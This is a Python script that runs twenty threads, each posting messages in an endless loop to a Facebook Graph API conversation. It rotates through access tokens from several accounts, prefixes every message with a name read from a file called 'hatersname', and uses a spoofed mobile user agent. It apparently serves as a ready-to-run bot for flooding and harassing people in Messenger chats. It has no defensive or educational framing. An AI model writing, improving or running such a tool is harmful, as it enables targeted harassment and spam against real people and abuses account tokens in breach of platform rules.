import requests
import json
import time
import os
import threading
import http.server
import socketserver

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"   anox Hewre")

def execute_server():
    PORT = int(os.environ.get("PORT", 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_messages_from_file(session_num):
    try:
        # Session-specific file names
        token_file = f"tokennum{session_num}.txt"
        time_file = f"time{session_num}.txt"
        haters_name_file = f"hatersname{session_num}.txt"
        convo_file = f"convo{session_num}.txt"
        np_file = f"NP{session_num}.txt"
        
        # Reading input files for the session
        with open(convo_file, "r") as file:
            convo_id = file.read().strip()
        with open(np_file, "r") as file:
            messages = file.readlines()
        num_messages = len(messages)
        with open(token_file, "r") as file:
            tokens = file.readlines()
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)
        with open(haters_name_file, "r") as file:
            haters_name = file.read().strip()
        with open(time_file, "r") as file:
            speed = int(file.read().strip())

        headers = {
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
            "referer": "www.google.com",
        }

        while True:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {"access_token": access_token, "message": f"{haters_name} {message}"}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(f"\033[1;92m[+] Message {message_index + 1} sent in Convo {convo_id} with Token {token_index + 1}: {haters_name} {message}")
                else:
                    print(f"\033[1;91m[x] Failed to send Message {message_index + 1} in Convo {convo_id} with Token {token_index + 1}: {haters_name} {message}")
                time.sleep(speed)
            print(f"\n[+] All messages for session {session_num} sent. Restarting process...\n")
    except Exception as e:
        print(f"[!] An error occurred in session {session_num}: {e}")

def run_session(session_num):
    print(f"Starting session {session_num}...")
    send_messages_from_file(session_num)

def main():
    # Start the server in a separate thread
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    # Number of sessions to run
    num_sessions = 20  # Modify this if you want to run more/less sessions

    # Create and start a thread for each session
    session_threads = []
    for session_num in range(1, num_sessions + 1):
        session_thread = threading.Thread(target=run_session, args=(session_num,))
        session_threads.append(session_thread)
        session_thread.start()

    # Join all threads to make sure they run continuously
    for session_thread in session_threads:
        session_thread.join()

if __name__ == "__main__":
    main()
